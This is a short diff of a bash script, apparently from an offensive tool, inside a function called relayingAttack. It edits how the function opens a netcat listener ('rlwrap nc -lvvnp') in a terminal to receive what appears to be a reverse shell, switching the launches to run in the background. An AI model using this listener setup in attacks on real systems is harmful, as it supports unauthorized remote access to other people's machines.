@@ -347,14 +347,14 @@ function relayingAttack(){
 
 	terminal=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
 	ncCommand='tput setaf 7; rlwrap nc -lvvnp '$lport
-	$terminal -hold -T $terminal -e "$SHELL -c '$ncCommand'" &>/dev/null && sleep 1
+	$terminal -hold -T $terminal -e "$SHELL -c '$ncCommand'" &>/dev/null &
 	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then 
-		$terminal --window --hide-menubar -e "$SHELL -c '$ncCommand'" &>/dev/null && sleep 1	
+		$terminal --window --hide-menubar -e "$SHELL -c '$ncCommand'" &>/dev/null & 
 	fi
 
 	if [ "$(netstat -tnualp | grep '/nc' | grep 'LISTEN' | grep $lport)" == "" ];then 
 		checkDependency "xterm"; 
-		xterm -hold -T 'XTerm' -e "$SHELL -c '$ncCommand'" &>/dev/null 
+		xterm -hold -T 'XTerm' -e "$SHELL -c '$ncCommand'" &>/dev/null &
 	fi
 	terminal_nc_PID=$!
 	
